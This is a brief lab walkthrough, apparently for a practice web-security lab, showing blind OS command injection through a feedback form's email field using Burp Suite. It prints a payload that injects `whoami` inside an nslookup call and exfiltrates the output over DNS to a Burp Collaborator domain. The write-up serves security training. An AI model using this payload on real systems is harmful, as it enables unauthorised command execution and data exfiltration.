Intercept the request using `BurpSuite` and then `Modify` the request that submits feedback:

Open `Burp Collaborator Client` and copy the domain. I this case : `slhdq2dusq3iiuxpdc5jqkr970dr1g.burpcollaborator.net`

Modify the email address changing it to:
```
b||nslookup+`whoami`.slhdq2dusq3iiuxpdc5jqkr970dr1g.burpcollaborator.net||
```

Send it.

Now go to Burp Collaborator, and press 'Poll now'. Now you will see some DNS interactions that were initiated by the application as the result of your payload.

Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. 

To complete the lab, enter the name of the current user in the `Submit Solution` box on the home page.
